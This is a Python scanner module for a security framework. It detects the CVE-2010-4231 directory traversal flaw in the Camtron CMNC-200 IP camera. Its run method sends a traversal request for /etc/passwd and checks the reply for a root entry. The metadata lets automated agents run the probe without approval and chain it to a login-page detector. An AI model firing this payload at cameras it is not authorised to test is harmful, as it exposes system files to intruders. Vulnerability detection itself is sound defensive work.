#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The CMNC-200 IP Camera has a built-in web server that is vulnerable to directory transversal attacks, allowing."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Camtron CMNC-200 IP Camera - Directory Traversal Detection',
        'description': 'The CMNC-200 IP Camera has a built-in web server that is vulnerable to directory transversal attacks, allowing access to any file on the camera file system.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'iot', 'lfi', 'camera', 'edb', 'camtron', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2010-4231',
            'https://www.exploit-db.com/exploits/15505',
            'https://www.trustwave.com/spiderlabs/advisories/TWSL2010-006.txt',
            'http://www.exploit-db.com/exploits/15505/',
            'https://github.com/K3ysTr0K3R/CVE-2010-4231-EXPLOIT',
        ],
        'cve': 'CVE-2010-4231',
    }

    def run(self):
        r = self.http_request(method="GET", path='/../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Camtron CMNC-200 IP Camera - Directory Traversal detected",
                path='/../../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

